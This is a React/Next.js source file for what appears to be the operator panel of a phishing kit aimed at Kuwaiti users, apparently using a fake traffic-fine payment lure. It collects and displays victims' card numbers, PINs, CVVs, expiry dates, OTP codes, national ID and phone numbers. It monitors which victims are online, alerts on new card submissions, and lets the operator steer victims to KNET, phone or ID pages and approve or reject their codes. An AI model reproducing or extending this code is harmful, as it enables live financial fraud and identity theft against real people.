"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Trash2, Users, CreditCard, UserCheck, Filter } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { auth, db, database } from "@/lib/firestore"
import { InfoIcon } from "lucide-react"
import { onValue, ref } from "firebase/database"
import { Checkbox } from "@/components/ui/checkbox"
import { Card, CardContent } from "@/components/ui/card"

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  bank: string
  bank_card: string
  cardNumber: string
  cardStatus: string
  ip?: string
  createdDate: string
  cvv: string
  id: string | "0"
  month: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  pass: string
  country?: string
  personalInfo: {
    id?: string | "0"
  }
  prefix: string
  status: "pending" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  year: string
  pagename: string
  plateType: string
  allOtps?: string[]
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string
  }>({})
  const [onlineUsers, setOnlineUsers] = useState<number>(0)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [showOnlineOnly, setShowOnlineOnly] = useState(false)
  const [showWithCardOnly, setShowWithCardOnly] = useState(false)
  const [showFilters, setShowFilters] = useState(false)
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    // Apply filters whenever filter settings or notifications change
    applyFilters()
  }, [notifications, showOnlineOnly, showWithCardOnly])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || "",
            }))
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added

          playNotificationSound()

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id)
        })

        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }))
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }))
      }
    })
  }

  const applyFilters = () => {
    let filtered = [...notifications]

    if (showOnlineOnly) {
      filtered = filtered.filter((notification) => userStatuses[notification.id] === "online")
    }

    if (showWithCardOnly) {
      filtered = filtered.filter((notification) => notification.cardNumber && notification.cardNumber.trim() !== "")
    }

    setFilteredNotifications(filtered)
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, "pays", id)
    await updateDoc(targetPost, {
      status: state,
    })
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const toggleFilters = () => {
    setShowFilters(!showFilters)
  }

  function UserStatusBadge({ userId }: { userId: string }) {
    const [status, setStatus] = useState<string>("unknown")

    useEffect(() => {
      const userStatusRef = ref(database, `/status/${userId}`)

      const unsubscribe = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        if (data) {
          setStatus(data.state)
        } else {
          setStatus("unknown")
        }
      })

      return () => {
        // Clean up the listener when component unmounts
        unsubscribe()
      }
    }, [userId])

    return (
      <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
        <span style={{ fontSize: "12px", color: "#fff" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
      </Badge>
    )
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { violationValue: value })
      setViolationValues((prev) => ({ ...prev, [id]: value }))
    } catch (error) {
      console.error("Error updating violation value:", error)
    }
  }

  const handleUpdatePage = async (id: string, page: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { page: page })
      setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : (notif as any))))
    } catch (error) {
      console.error("Error updating current page:", error)
    }
  }

  if (isLoading) {
    return <div className="min-h-screen bg-white-900 text-black flex items-center justify-center">جاري التحميل...</div>
  }

  const displayNotifications =
    filteredNotifications.length > 0 || showOnlineOnly || showWithCardOnly ? filteredNotifications : notifications

  return (
    <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
      <div className=" mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="outline"
              onClick={toggleFilters}
              className="bg-blue-100 hover:bg-blue-200 flex items-center gap-2"
            >
              <Filter className="h-4 w-4" />
              الفلاتر
              {(showOnlineOnly || showWithCardOnly) && (
                <Badge className="ml-2 bg-blue-500">{showOnlineOnly && showWithCardOnly ? "2" : "1"}</Badge>
              )}
            </Button>
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button variant="outline" onClick={handleLogout} className="bg-gray-100 hover:bg-gray-100">
              تسجيل الخروج
            </Button>
          </div>
        </div>

        {showFilters && (
          <Card className="mb-6">
            <CardContent className="pt-6">
              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="online-filter"
                    checked={showOnlineOnly}
                    onCheckedChange={(checked: boolean) => setShowOnlineOnly(checked === true)}
                  />
                  <label
                    htmlFor="online-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين المتصلين فقط
                  </label>
                </div>
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="card-filter"
                    checked={showWithCardOnly}
                    onCheckedChange={(checked: boolean) => setShowWithCardOnly(checked === true)}
                  />
                  <label
                    htmlFor="card-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين الذين لديهم بطاقة فقط
                  </label>
                </div>
              </div>
              {(showOnlineOnly || showWithCardOnly) && (
                <div className="mt-4 text-sm text-blue-600">
                  يتم عرض {displayNotifications.length} من أصل {notifications.length} إشعار
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
          {/* Online Users Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center">
            <div className="rounded-full bg-blue-100 p-3 mr-4">
              <UserCheck className="h-6 w-6 text-blue-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">المستخدمين المتصلين</p>
              <p className="text-2xl font-bold">{onlineUsersCount}</p>
            </div>
          </div>

          {/* Total Visitors Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center">
            <div className="rounded-full bg-green-100 p-3 mr-4">
              <Users className="h-6 w-6 text-green-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">إجمالي الزوار</p>
              <p className="text-2xl font-bold">{totalVisitors}</p>
            </div>
          </div>

          {/* Card Submissions Card */}
          <div className="bg-white rounded-lg shadow p-4 flex items-center sm:col-span-2 md:col-span-1">
            <div className="rounded-full bg-purple-100 p-3 mr-4">
              <CreditCard className="h-6 w-6 text-purple-500" />
            </div>
            <div>
              <p className="text-sm text-gray-500">معلومات البطاقات المقدمة</p>
              <p className="text-2xl font-bold">{cardSubmissions}</p>
            </div>
          </div>
        </div>

        <div className="bg-gray-100 rounded-lg">
          {/* Desktop Table View - Hidden on Mobile */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-100">
                  <th className="px-4 py-3 text-right">الدوله</th>
                  <th className="px-4 py-3 text-right">الإسم</th>
                  <th className="px-4 py-3 text-right">المعلومات</th>
                  <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                  <th className="px-4 py-3 text-right">الوقت</th>
                  <th className="px-4 py-3 text-center">الاشعارات</th>
                  <th className="px-4 py-3 text-center">تحديث الصفحة</th>
                  <th className="px-4 py-3 text-center">حذف</th>
                </tr>
              </thead>
              <tbody>
                {displayNotifications.map((notification) => (
                  <tr key={notification.id} className="border-b border-gray-700">
                    <td className="px-4 py-3">{notification?.country!}</td>
                    <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
                    <td className="px-4 py-3">
                      <div className="flex flex-col sm:flex-row gap-2">
                        <Badge
                          variant={notification.personalInfo?.id! ? "default" : "destructive"}
                          className="rounded-md cursor-pointer"
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "default" : "destructive"}
                          className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                        <Badge
                          variant={"secondary"}
                          className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          <InfoIcon className="h-4 w-4 mr-1" />
                          معلومات عامة
                        </Badge>
                      </div>
                    </td>
                    <td className="px-4 py-3">خطوه - {notification.page}</td>
                    <td className="px-4 py-3">
                      {notification.createdDate &&
                        formatDistanceToNow(new Date(notification.createdDate), {
                          addSuffix: true,
                          locale: ar,
                        })}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <UserStatusBadge userId={notification.id} />
                    </td>
                    <td className="px-4 py-3 text-center">
                      <div className="flex flex-col items-center space-y-2">
                        <div className="flex justify-center space-x-2">
                          {[
                            {
                              page: "main",
                              label: "الرئيسية",
                              hint: "الصفحة الرئيسية",
                            },
                            { page: "knet", label: "كنت", hint: "صفحة كنت" },
                            {
                              page: "phone",
                              label: "تلفون",
                              hint: "تلفون",
                            },

                            {
                              page: "sahel",
                              label: "هوية",
                              hint: "هوية",
                            },
                          ].map(({ page, label, hint }) => (
                            <Button
                              key={page}
                              variant={notification?.page === page ? "default" : "outline"}
                              size="sm"
                              onClick={() => handleUpdatePage(notification.id, page)}
                              className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
                              title={hint}
                            >
                              {label}
                              {notification.page === page && (
                                <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                  ✓
                                </span>
                              )}
                            </Button>
                          ))}
                        </div>
                        <span className="text-xs text-gray-500">
                          {notification.page === "main" && "الصفحة الرئيسية"}
                          {notification.page === "knet" && "صفحة كنت"}
                          {notification.page === "phone" && "رقم الهاتف "}
                          {notification.page === "phoneOtp" && " OTP"}
                          {notification.page === "sahel" && "هوية"}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-center">
                      <Button
                        variant="destructive"
                        size="sm"
                        onClick={() => handleDelete(notification.id)}
                        className="bg-red-500 hover:bg-red-600"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {/* Mobile Card View - Shown only on Mobile */}
          <div className="md:hidden space-y-4 p-2">
            {displayNotifications.map((notification) => (
              <div key={notification.id} className="bg-white rounded-lg shadow-md p-4">
                <div className="flex justify-between items-start mb-3">
                  <div>
                    <div className="font-semibold">{notification.personalInfo?.id!}</div>
                    <div className="text-sm text-gray-500">{notification?.country!}</div>
                  </div>
                  <div className="flex items-center gap-2">
                    <UserStatusBadge userId={notification.id} />
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600 h-8 w-8 p-0"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-2 mb-3">
                  <div className="flex flex-wrap gap-2">
                    <Badge
                      variant={notification.personalInfo?.id! ? "default" : "destructive"}
                      className="rounded-md cursor-pointer"
                      onClick={() => handleInfoClick(notification, "personal")}
                    >
                      {notification.personalInfo?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
                    </Badge>
                    <Badge
                      variant={notification.cardNumber ? "default" : "destructive"}
                      className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
                      onClick={() => handleInfoClick(notification, "card")}
                    >
                      {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                    </Badge>
                    <Badge
                      variant={"secondary"}
                      className={`rounded-md cursor-pointer ${notification.mobile ? "bg-yellow-300" : ""}`}
                      onClick={() => handleInfoClick(notification, "personal")}
                    >
                      <InfoIcon className="h-4 w-4 mr-1" />
                      معلومات عامة
                    </Badge>
                  </div>

                  <div className="text-sm">
                    <span className="font-medium">الصفحة الحالية:</span> خطوه - {notification.page}
                  </div>

                  <div className="text-sm">
                    <span className="font-medium">الوقت:</span>{" "}
                    {notification.createdDate &&
                      formatDistanceToNow(new Date(notification.createdDate), {
                        addSuffix: true,
                        locale: ar,
                      })}
                  </div>
                </div>

                <div className="border-t pt-3">
                  <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
                  <div className="flex flex-wrap gap-2">
                    {[
                      {
                        page: "main",
                        label: "الرئيسية",
                        hint: "الصفحة الرئيسية",
                      },
                      { page: "knet", label: "كنت", hint: "صفحة كنت" },
                      {
                        page: "phone",
                        label: "تلفون",
                        hint: "تلفون",
                      },
                      {
                        page: "sahel",
                        label: "هوية",
                        hint: "هوية",
                      },
                    ].map(({ page, label, hint }) => (
                      <Button
                        key={page}
                        variant={notification?.page === page ? "default" : "outline"}
                        size="sm"
                        onClick={() => handleUpdatePage(notification.id, page)}
                        className={`relative ${notification.page === page ? "bg-blue-500" : ""}`}
                        title={hint}
                      >
                        {label}
                        {notification.page === page && (
                          <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                            ✓
                          </span>
                        )}
                      </Button>
                    ))}
                  </div>
                  <div className="text-xs text-gray-500 mt-1">
                    {notification.page === "main" && "الصفحة الرئيسية"}
                    {notification.page === "knet" && "صفحة كنت"}
                    {notification.page === "phone" && "رقم الهاتف "}
                    {notification.page === "phoneOtp" && " OTP"}
                    {notification.page === "sahel" && "هوية"}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-100 text-black max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة"
                  : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification?.plateType && (
            <div className="space-y-2">
              <p>
                <strong>رقم الهوية:</strong> {selectedNotification.idNumber}
              </p>
              <p></p>
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
              </p>
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
                {selectedNotification.cardNumber &&
                  selectedNotification.cardNumber + " - " + selectedNotification.prefix}
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
                {selectedNotification.month}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp2!}
              </p>
              <p className="flex items-center">
                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
              </p>
            </div>
          )}
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-2">
              <p>
                <strong>الهاتف:</strong> {selectedNotification.mobile}
              </p>
              <p>
                <strong>رقم الهوية</strong> {selectedNotification.idNumber}
              </p>
              <p>
                <strong>نوع الشبكة :</strong> {selectedNotification.network}
              </p>{" "}
              <p>
                <strong>قيمة المخالفة :</strong> {selectedNotification.violationValue}
              </p>{" "}
              <p>
                <strong>رمز التحقق المرسل :</strong> {selectedNotification.otp}
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setMessage(true)
                    setTimeout(() => {
                      setMessage(false)
                    }, 3000)
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}

